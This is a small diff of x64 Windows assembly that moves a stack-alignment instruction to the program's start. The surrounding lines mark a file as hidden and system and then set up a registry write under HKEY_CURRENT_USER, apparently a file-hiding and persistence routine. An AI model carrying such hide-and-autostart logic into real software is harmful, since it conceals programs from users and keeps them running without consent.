@@ -41,7 +41,7 @@ REG_SZ	equ 1
 
 start		proc
 	
-	
+	sub		rsp, 28h
 
 
 ;------------------------------------
@@ -156,7 +156,7 @@ l9:	mov al, byte ptr[rcx]
 	mov rdx, FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN
 	call SetFileAttributesA 
 
-	sub		rsp, 28h
+	
 	mov rcx, HKEY_CURRENT_USER 
 	lea rdx, lpSubkey
 	xor r8, r8
